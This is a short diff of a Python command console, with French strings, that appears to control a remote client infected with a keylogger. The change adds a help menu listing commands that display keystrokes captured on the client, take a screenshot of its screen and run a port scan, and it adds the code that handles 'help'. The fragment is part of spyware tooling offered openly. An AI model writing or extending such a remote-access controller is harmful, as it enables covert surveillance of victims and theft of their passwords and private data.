@@ -8,13 +8,26 @@ keylog_file = "keylog.txt"
 def handle_connection(connection, address):
     print(f"Connexion établie avec {address}")
 
+    help_text = """
+        Commandes disponibles:
+        - exit : Ferme la connexion avec le client.
+        - keylog : Affiche les frappes enregistrées par le keylogger.
+        - screenshot : Prend une capture d'écran du client et l'enregistre sous le nom 'screen.png'.
+        - scan <start_port> <end_port> : Effectue un scan des ports dans la plage spécifiée.
+        - help : Affiche cette aide.
+        """
+
     while True:
         try:
-            command = input("Entrer une commande à exécuter ('exit' pour terminer, 'keylog' pour afficher les frappes) : ")
+            command = input("Entrer 'help' pour afficher les commandes disponibles ou 'exit' pour quitter : ")
 
             if command.lower() == 'exit':
                 connection.send(b'quit')
                 break
+
+            elif command.lower() == 'help':
+                print(help_text)
+                continue
 
             elif command.lower() == 'keylog':
                 try:
